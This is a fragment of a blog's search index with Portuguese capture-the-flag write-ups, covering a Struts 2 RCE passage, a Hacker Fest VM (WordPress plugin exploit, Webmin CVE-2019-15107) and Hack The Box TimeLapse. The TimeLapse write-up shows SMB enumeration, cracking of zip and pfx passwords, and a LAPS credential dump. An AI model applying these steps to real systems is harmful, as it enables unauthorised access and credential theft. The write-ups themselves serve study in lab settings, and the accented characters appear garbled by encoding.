explora√ß√£o.Procurando por exploits do struts 2 no metasploit, encontramos um RCE.Vamos configurar o exploit com as informa√ß√µes que precisa.Ao executar o exploit conseguimos a conex√£o reversa.Como visto, j√° estamos como root e n√£o vamos precisar escalar privil√©gios." }, { "title": "Desafio 2 - VM 01", "url": "/posts/desafio2-becodoxpl-vm1/", "categories": "Desafio 2, Beco do Exploit, Writeups", "tags": "Desafio 2, Writeups, Linux, WordPress", "date": "2022-04-07 22:00:00 +0000", "snippet": "Desafio 02 - Beco do ExploitCome√ßa aqui o desafio 2 do Beco do Exploit, onde vamos explorar 30 m√°quinas ao todo, indo desde a explora√ß√£o automatizada, fazendo uso de exploits existentes at√© o desenvolvimento de exploit para a explora√ß√£o das VMs.O desafio pode ser encontrado no Canal do YouTube.VM 1 - Hacker Fest 2019Reconhecimento:NMAP:‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -p- 192.168.56.4 -vStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 14:05 EDTPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)80/tcp open http Apache httpd 2.4.25 ((Debian))10000/tcp open ssl/http MiniServ 1.890 (Webmin httpd)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelExplora√ß√£o do WordPressAo acessar a porta 80 pelo browser, percebemos logo que se trata de uma aplica√ß√£o em WordPress.Ao rodar o wpscan, temos um plugin interessante.Procuramos por algo no metasploit com o comando search e encontramos o seguinte m√≥dulo:Vamos preencher as op√ß√µes com os dados :Ao rodar o exploit, temos acesso ao hash da senha do usu√°rio webmaster:Vamos usar o john para quebra de hash.Como visto no scan no nmap, temos um servi√ßo de SSH rodando na porta 22.Conseguimos fazer o login com o usu√°rio webmaster utilizando a senha que conseguimos extrair do hash.A flag de usu√°rio j√° est√° no diret√≥rio que estamos.Ao rodar o comando para ver o que o usu√°rio pode fazer como root, descobrimos que ele tem acesso total, facilitando a escalagem de privil√©gios.E dentro do diret√≥rio /root , achamos a outra flag.Explora√ß√£o WebminNo scan no nmap, conseguimos ver que na porta 10000, existe um servi√ßo Webmin vers√£o 1.890 rodando.Ao procurar no searchsploit, vimos que existe um m√≥dulo do metasploit, que possibilita um RCE.Vamos buscar ele no metasploit e seleciona-lo.Vendo as informa√ß√µes do m√≥dulo, vemos a CVE-2019-15107.Ao olhar a CVE, vemos que ela foi feita para a vers√£o 1.920 do Webmin, mas funciona tamb√©m na vers√£o 1.890, que √© a que estamos explorando.Teremos que for√ßar a execu√ß√£o desse exploit usando o force exploit.Agora vamos preencher as op√ß√µes do exploitAo executar o exploit, conseguimos o RCE e podemos ver que j√° estamos como root, n√£o precisando escalar privil√©gios." }, { "title": "Hack The Box - TimeLapse", "url": "/posts/htb-timelapse-writeup/", "categories": "Hack The Box, Writeups", "tags": "HTB, Writeups, Windows, Easy, LAPS", "date": "2022-04-05 12:00:00 +0000", "snippet": "Hack the Box - TimelapseReconhecimento:NMAP SCAN‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ nmap -sV -Pn -p- --min-rate 1000 10.10.11.152 -vStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-01 22:20 EDT PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-02 10:27:50Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp open mc-nmf .NET Message Framing49667/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049696/tcp open msrpc Microsoft Windows RPC53816/tcp open msrpc Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsDentre v√°rias portas abertas, podemos ver que as portas 139 e 445 SMB est√£o abertas.Vamos enumerar os compartilhamentos desse servi√ßo.Listando as pastas do SMB.‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ smbclient -L //10.10.11.152/Enter WORKGROUP\\red_arrow's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup availableDentro da pasta Shares temos:‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~]‚îî‚îÄ$ smbclient //10.10.11.152/SharesEnter WORKGROUP\\red_arrow's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Oct 25 11:39:15 2021 .. D 0 Mon Oct 25 11:39:15 2021 Dev D 0 Mon Oct 25 15:40:06 2021 HelpDesk D 0 Mon Oct 25 11:48:42 2021 6367231 blocks of size 4096. 1152581 blocks availablesmb: \\&gt;Dentro da pasta Dev temos um arquivo de backupsmb: \\&gt; cd Devsmb: \\Dev\\&gt; ls . D 0 Mon Oct 25 15:40:06 2021 .. D 0 Mon Oct 25 15:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 11:46:42 2021 6367231 blocks of size 4096. 1152580 blocks availablesmb: \\Dev\\&gt;Dentro da pasta HelpDesk temossmb: \\&gt; cd HelpDesksmb: \\HelpDesk\\&gt; ls . D 0 Mon Oct 25 11:48:42 2021 .. D 0 Mon Oct 25 11:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 10:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 10:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 10:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 10:57:44 2021 6367231 blocks of size 4096. 1147148 blocks availablesmb: \\HelpDesk\\&gt;Ap√≥s fazer o download dos arquivos encontrados, vemos que o arquivo winrm_backup.zip est√° protegido por senha.Vamos usar o zip2john para extrair o hash da senha do arquivo compactado para que seja poss√≠vel fazer o bruteforce‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~/Documents/HackTheBox/Timelapse]‚îî‚îÄ$ zip2john winrm_backup.zip &gt; password.txtver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8Faremos um bruteforce para tentar quebrar a senha:Ap√≥s extrair o conteudo, temos acesso a um arquivo pfx com senha.Vamos usar o pfx2john para extrair o hash da senha novamente‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~/Documents/HackTheBox/Timelapse]‚îî‚îÄ$ pfx2john legacyy_dev_auth.pfx &gt; legacy.txtVamos tentar quebrar a senha denovo usando o john.Agora que temos a senha, vamos extrair o certificado e a chave do client do arquivo pfx.‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~/Documents/HackTheBox/Timelapse]‚îî‚îÄ$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.keyEnter Import Password:Enter PEM pass phrase:Verifying - Enter PEM pass phrase:‚îå‚îÄ‚îÄ(red_arrow„âøkali)-[~/Documents/HackTheBox/Timelapse]‚îî‚îÄ$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crtEnter Import Password:Como visto no scan do nmap, temos a porta 5986 - WinRM aberta.Agora que temos os certificados do client, tentaremos acessar um powershell remoto com o evil-winrmConseguimos acesso a m√°quina.Buscando nos diret√≥rios que temos acesso, achamos a flag de usuario (user.txt) no Desktop do usu√°rio que estamos logados.Continuando a explora√ß√£o, vamos olhar no hist√≥rico do powershell para ver se encontramos algo de interessante.Conseguimos achar as credenciais de outro usu√°rio.Agora podemos acessar ao powershell remoto usando o usu√°rio e a senha que encontramos.Ao enumerar os usu√°rios do AD, encontramos o user AdministratorAl√©m do arquivo de backup que encontramos no SMB, tamb√©m encontramos v√°rios documentos a respeito da implanta√ß√£o do servi√ßo LPAS.Sabendo que as senhas do ‚ÄòAdministrator‚Äô s√£o salvas localmente no Active Directory, vamos tentar fazer o dump das credenciais.Agora que temos a senha do Administrator, vamos fazer login usando novamente o Evil-WinRM.Ap√≥s um tempo buscando a flag do root, que n√£o estava no Desktop do user, como de costume, tentei ver nos outros usu√°rios.E estava no Desktop de outro usu√°rio.E assim conseguimos comprometer a m√°quina e conseguir as duas flags." } ]
